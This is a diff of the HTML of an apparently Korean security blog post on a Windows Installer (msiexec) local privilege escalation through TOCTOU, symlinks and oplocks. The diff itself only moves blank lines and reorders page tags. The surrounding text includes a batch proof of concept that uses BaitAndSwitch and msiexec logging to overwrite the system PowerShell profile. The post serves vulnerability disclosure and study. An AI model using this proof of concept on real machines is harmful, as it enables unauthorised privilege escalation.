@@ -246,7 +246,6 @@
 </ul>
 <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Windows Installer(MSI)&#xC5D0;&#xC11C; TOCTOU&#xC640; symlink&#xB97C; &#xD1B5;&#xD55C; Local Privilege Escalation &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <code>msiexec</code>&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC744; &#xD544;&#xC694;&#xB85C; &#xD558;&#xC9C0;&#xB9CC; repair operation &#xC218;&#xD589;&#xC744; &#xC704;&#xD574; <code>/f</code> &#xC635;&#xC158;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xC774; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>/L</code> &#xC635;&#xC158;&#xACFC; &#xD568;&#xAED8; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB85C;&#xADF8; &#xD30C;&#xC77C;&#xC744; &#xC9C0;&#xC815;&#xB41C; &#xACF3;&#xC5D0; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs taggerscript">msiexec /f C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller<span class="hljs-symbol">\1</span>48d3c4.msi /L C:<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\f</span>oo.log</code></pre>
-
 <p>symlink&#xB97C; &#xD1B5;&#xD574; <code>foo.log</code>&#xAC00; &#xCCAB; CreatFile&#xC5D0;&#xC11C; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; impersnation &#xB420; &#xB54C; oplock&#xC744; &#xC124;&#xCE58;&#xD558;&#xBA74; &#xB2E4;&#xC74C; &#xC4F0;&#xAE30;/&#xC77D;&#xAE30; &#xC791;&#xC5C5;&#xC740; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB41C; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. PowerShell&#xC744; Overwrite&#xD558;&#xC5EC; LPE&#xB97C; &#xD558;&#xB294; POC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs latex">@echo off
 REM Put BaitAndSwitch, example.msi into C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span>
@@ -254,7 +253,6 @@ echo &gt; C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><s
 start C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">BaitAndSwitch</span></span> C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">linkdir</span></span><span class="hljs-tag">\<span class="hljs-name">link</span></span> C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">fakelog</span></span>.txt C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">System</span></span>32<span class="hljs-tag">\<span class="hljs-name">WindowsPowerShell</span></span><span class="hljs-tag">\<span class="hljs-name">v</span></span>1.0<span class="hljs-tag">\<span class="hljs-name">profile</span></span>.ps1
 timeout /t 1
 msiexec /j C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">example</span></span>.msi /t ksz /Li! C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">linkdir</span></span><span class="hljs-tag">\<span class="hljs-name">link</span></span> /qn</code></pre>
-
 
             </div>
             <hr>
@@ -274,11 +272,11 @@ msiexec /j C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><
                   
                   <a class="hover-with-bg" href="/tags/cve/">cve</a>
                   
+                  <a class="hover-with-bg" href="/tags/toctou/">toctou</a>
+                  
                   <a class="hover-with-bg" href="/tags/lpe/">lpe</a>
                   
                   <a class="hover-with-bg" href="/tags/microsoft/">microsoft</a>
-                  
-                  <a class="hover-with-bg" href="/tags/toctou/">toctou</a>
                   
                   <a class="hover-with-bg" href="/tags/idioth/">idioth</a>
                   
